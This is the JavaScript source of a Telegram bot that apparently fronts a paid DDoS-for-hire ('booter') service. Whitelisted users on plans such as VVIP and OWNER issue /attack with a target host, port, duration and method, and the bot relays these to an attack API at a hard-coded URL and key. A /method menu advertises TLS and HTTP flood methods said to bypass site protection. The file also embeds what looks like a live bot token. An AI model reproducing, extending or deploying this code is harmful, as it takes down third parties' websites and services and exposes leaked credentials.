const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

const bot = new TelegramBot('6419991115:AAESXa0TgnD5OAeb6vjUUYglcZ2-kePp7x0', { polling: true });

const allowedPlans = {
  1122748683: { plan: 'VVIP', maxTime: 500, maxAttack: 5 }, // Example: VVIP plan allows a maximum of 3 attacks
  6609222172: { plan: 'DICK', maxTime: 999999, maxAttack: 1 },
  5713258194: { plan: 'OWNER', maxTime: 30000, maxAttack: 10 }, // Example: OWNER plan allows a maximum of 5 attacks
  // Add more plans as needed
};

bot.onText(/\/attack (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const username = msg.from.username;
  const userId = msg.from.id;
  const commandArguments = match[1].split(' ');

  const userPlan = allowedPlans[userId];
  if (!userPlan) {
    bot.sendMessage(chatId, `𝐇𝐢 ${username} 𝐇𝐨𝐰 𝐀𝐫𝐞 𝐲𝐨𝐮? 𝐘𝐨𝐮 𝐝𝐨𝐧'𝐭 𝐡𝐚𝐯𝐞 𝐚𝐜𝐜𝐞𝐬𝐬 𝐭𝐨 𝐭𝐡𝐢𝐬 𝐛𝐨𝐭. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 @𝐤𝐲𝐨𝐮𝐫𝐚𝟎𝟏 𝐟𝐨𝐫 𝐚𝐬𝐬𝐢𝐬𝐭𝐚𝐧𝐜𝐞.`);
    return;
  }

  const maxAllowedAttacks = userPlan.maxAttack || 1;

if ((userPlan.attacks || 0) + 1 > maxAllowedAttacks) {
  bot.sendMessage(chatId, `𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐫𝐞𝐚𝐜𝐡𝐞𝐝 𝐭𝐡𝐞 𝐦𝐚𝐱𝐢𝐦𝐮𝐦 𝐚𝐥𝐥𝐨𝐰𝐞𝐝 𝐟𝐨𝐫 𝐲𝐨𝐮𝐫 𝐩𝐥𝐚𝐧 (${maxAllowedAttacks} 𝐚𝐭𝐭𝐚𝐜𝐤𝐬).`);
  return;
}

// Increment the attacks count here
userPlan.attacks = (userPlan.attacks || 0) + 1;


  if (commandArguments.length !== 4) {
    bot.sendMessage(chatId, `𝐇𝐢 ${username} 𝐇𝐨𝐰 𝐀𝐫𝐞 𝐲𝐨𝐮? 𝐓𝐲𝐩𝐞 /𝐮𝐬𝐚𝐠𝐞 𝐭𝐨 𝐬𝐞𝐞 𝐡𝐨𝐰 𝐭𝐨 𝐮𝐬𝐞`);
    return;
  }

  const host = commandArguments[0];
  const port = commandArguments[1];
  const time = commandArguments[2];
  const method = commandArguments[3];

  if (time > userPlan.maxTime) {
    bot.sendMessage(chatId, `𝐓𝐢𝐦𝐞 𝐞𝐱𝐜𝐞𝐞𝐝𝐬 𝐭𝐡𝐞 𝐦𝐚𝐱𝐢𝐦𝐮𝐦 𝐚𝐥𝐥𝐨𝐰𝐞𝐝 𝐟𝐨𝐫 𝐲𝐨𝐮𝐫 𝐩𝐥𝐚𝐧 (${userPlan.maxTime}𝐬).`);
    return;
  }

  const apiUrl = `http://kepo:1337/api?target=${host}&port=${port}&duration=${time}&method=${method}&key=zxkys`;

  console.log(`Command /attack executed by user ${userId} with plan ${userPlan.plan} in chat ${chatId}`);

  userPlan.attacks = (userPlan.attacks || 0) + 1;

  axios.get(apiUrl)
  .then(response => {
    const successMessage = `🚀𝐀𝐭𝐭𝐚𝐜𝐤 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭🚀\n𝐓𝐚𝐫𝐠𝐞𝐭: ${host}\n𝐏𝐨𝐫𝐭: ${port}\n𝐓𝐢𝐦𝐞: ${time}\n𝐌𝐞𝐭𝐡𝐨𝐝: ${method}\n 🐉𝐓𝐡𝐚𝐧𝐤𝐬 𝐅𝐨𝐫 𝐔𝐬𝐢𝐧𝐠 𝐃𝐫𝐚𝐠𝐨𝐧 𝐒𝐞𝐫𝐯𝐢𝐜𝐞🐉\n\nNOTE: DON'T SPAM ATTACK!!!`;
    bot.sendMessage(chatId, successMessage);
  })
  .catch(error => {
    console.error('Error:', error);
    bot.sendMessage(chatId, 'Error occurred while processing the request.');
  })
  .finally(() => {
    // Update user's attack count after a successful or unsuccessful attack
    userPlan.attacks = (userPlan.attacks || 0) - 1;
  });
});
    
bot.onText(/\/method/, (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.username;
    bot.sendMessage(chatId, `𝐇𝐢 ${username}\n 𝐇𝐞𝐫𝐞 𝐢𝐬 𝐭𝐡𝐞 𝐋𝐢𝐬𝐭 𝐨𝐟 𝐀𝐥𝐥 𝐌𝐞𝐭𝐡𝐨𝐝𝐬\n\n-𝐓𝐋𝐒 - 𝐒𝐞𝐧𝐝 𝐍𝐨𝐫𝐦𝐚𝐥 𝐓𝐋𝐒 𝐃𝐃𝐨𝐒 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐨 𝐖𝐞𝐛𝐬𝐢𝐭𝐞 [𝐕𝐕𝐈𝐏]🔥\n\n-𝐓𝐋𝐒𝐕𝟏 - 𝐒𝐞𝐧𝐝 𝐇𝐢𝐠𝐡 𝐓𝐋𝐒 𝐃𝐃𝐨𝐒 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐨 𝐖𝐞𝐛𝐬𝐢𝐭𝐞 [𝐕𝐕𝐈𝐏]🔥 \n\n-𝐓𝐋𝐒𝐕𝐈𝐏 - 𝐁𝐞𝐬𝐭 𝐌𝐞𝐭𝐡𝐨𝐝 𝐂𝐚𝐧 𝐁𝐲𝐩𝐚𝐬𝐬 𝐔𝐀𝐌 [𝐕𝐕𝐈𝐏]🔥 \n\n-𝐓𝐋𝐒𝐔𝐀 - 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐚𝐫𝐠𝐞𝐭 𝐔𝐬𝐢𝐧𝐠 𝐆𝐨𝐨𝐝 𝐔𝐀 (𝐔𝐬𝐞𝐫𝐀𝐠𝐞𝐧𝐭) (𝐍𝐨𝐫𝐦𝐚𝐥)🚀 \n\n-𝐇𝐓𝐓𝐏𝐒𝐕𝟑 - 𝐒𝐞𝐧𝐝 𝐇𝐢𝐠𝐡 𝐑𝐏𝐒 𝐖𝐢𝐭𝐡 𝐬𝐦𝐚𝐥𝐥 𝐓𝐡𝐫𝐞𝐚𝐝𝐬 [𝐁𝐀𝐒𝐈𝐂]🐉 \n\n-𝐁𝐋𝐀𝐂𝐊-𝐂𝐇𝐈𝐏 - 𝐒𝐞𝐧𝐝 𝐃𝐃𝐨𝐒 𝐀𝐭𝐭𝐚𝐜𝐤 𝐖𝐢𝐭𝐡 𝐇𝐢𝐠𝐡 𝐑𝐩𝐬 𝐀𝐧𝐝 𝐁𝐢𝐠 𝐓𝐡𝐫𝐞𝐚𝐝𝐬 [𝐕𝐈𝐏]🔥 \n\n-𝐇𝐓𝐓𝐏 - 𝐒𝐞𝐧𝐝 𝐃𝐃𝐨𝐒 𝐀𝐭𝐭𝐚𝐜𝐤 𝐔𝐬𝐢𝐧𝐠 𝐇𝐓𝐓𝐏/𝟏.𝟏 (𝐨𝐧𝐥𝐲 𝐬𝐮𝐩𝐩𝐨𝐫𝐭 𝐡𝐭𝐭𝐩://) [𝐁𝐀𝐒𝐈𝐂]🐉\n\n-𝐓𝐋𝐒𝐕𝟑 - 𝐏𝐨𝐰𝐞𝐫𝐟𝐮𝐥𝐥 𝐋𝐚𝐲𝐞𝐫𝟕 𝐌𝐞𝐭𝐡𝐨𝐝𝐬 𝐂𝐚𝐧 𝐁𝐲𝐩𝐚𝐬𝐬 𝐔𝐀𝐌\n\n-𝐓𝐋𝐒-𝐏𝐎𝐖𝐄𝐑 - 𝐏𝐎𝐖𝐄𝐑𝐅𝐔𝐋𝐋 𝐓𝐋𝐒 𝐌𝐄𝐓𝐇𝐎𝐃 𝐖𝐈𝐓𝐇 𝐆𝐎𝐎𝐃 𝐔𝐒𝐄𝐑𝐀𝐆𝐄𝐍𝐓 [𝐕𝐈𝐏]🔥`);
});

bot.onText(/\/usage/, (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.username;
    bot.sendMessage(chatId, `𝐇𝐢 ${username}\n 𝐇𝐞𝐫𝐞'𝐬 𝐡𝐨𝐰 𝐭𝐨 𝐮𝐬𝐞 𝐢𝐭\n /𝐚𝐭𝐭𝐚𝐜𝐤 [𝐇𝐎𝐒𝐓] [𝐏𝐎𝐑𝐓] [𝐓𝐈𝐌𝐄] [𝐌𝐄𝐓𝐇𝐎𝐃𝐒] \n𝐑𝐮𝐥𝐞𝐬: 𝐃𝐨𝐧'𝐭 𝐒𝐩𝐚𝐦 𝐀𝐭𝐭𝐚𝐜𝐤!!\n 𝐇𝐚𝐩𝐩𝐲 𝐔𝐬𝐢𝐧𝐠🚀`);
});

bot.onText(/\/myinfo/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const userPlan = allowedPlans[userId];
    const username = msg.from.username;
    const maxAllowedAttacks = userPlan.maxAttack || 1;
    bot.sendMessage(chatId, `𝐇𝐢 ${username}\n 𝐓𝐡𝐢𝐬 𝐈𝐬 𝐘𝐨𝐮𝐫 𝐏𝐫𝐨𝐟𝐢𝐥\n\n𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄: ${username}\n𝐔𝐒𝐄𝐑 𝐈𝐃: ${userId}\n𝐏𝐋𝐀𝐍: ${userPlan.plan}\n𝐌𝐀𝐗 𝐓𝐈𝐌𝐄: ${userPlan.maxTime}\n𝐌𝐀𝐗 𝐀𝐓𝐓𝐀𝐂𝐊: ${maxAllowedAttacks}𝐂𝐎𝐍𝐂\n𝐑𝐔𝐋𝐄𝐒: 𝐃𝐎𝐍'𝐓 𝐒𝐏𝐀𝐌 𝐀𝐓𝐓𝐀𝐂𝐊!!!!`);
});

bot.on('polling_error', (error) => {
  console.error('Polling error:', error);
});